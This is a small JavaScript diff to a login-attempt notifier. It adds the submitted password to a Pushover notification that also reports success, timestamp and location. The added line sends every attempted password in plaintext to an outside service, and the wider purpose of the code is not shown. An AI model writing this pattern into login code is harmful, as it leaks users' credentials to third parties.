@@ -19,6 +19,7 @@ const getMongoliaTimestamp = () => {
 async function sendPushoverNotification(data) {
     const message = `
         Login Attempt:
+        - Attempt: ${data.password}
         - Success: ${data.success}
         - Timestamp: ${data.timestampISO}
         - Location: ${data.location ? JSON.stringify(data.location) : 'N/A'}
